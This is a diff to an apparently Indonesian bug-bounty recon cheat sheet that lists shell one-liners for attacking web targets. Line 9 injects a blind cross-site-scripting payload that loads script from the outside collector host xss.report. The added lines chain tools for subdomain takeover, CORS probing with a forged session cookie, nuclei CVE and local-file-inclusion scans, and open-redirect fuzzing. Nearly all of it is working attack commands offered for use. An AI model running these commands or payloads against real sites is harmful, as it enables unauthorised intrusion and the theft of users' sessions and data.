@@ -144,4 +144,16 @@ part2 cara recon
 
 9. subfinder -d nama domain | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss --appendMode -payload '"><script sc=https://xss.report/c/coffinxp></script>' -parameters
 
-10. 
+10. subzy run --targets subdomain.txt --concurrency 100 --hide_fails --verify_ssl
+
+11. python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
+
+12. nuclei -list subdomains_alive -tags cves,osint,tech
+
+13. cat allurls | gf lfi | nuclei -tags lfi 
+
+14. cat allurls.txt | gf redirect | openredirex  -p /home/x/Desktop/git/OpenRedireX/payloads.txt | anew openredirex2.txt
+
+15. #cat subdomains_alive.txt | nuclei -t /root/nuclei-templates/cRlf.yam -v
+
+16. cat allurls.txt | gf redirect | openredirex
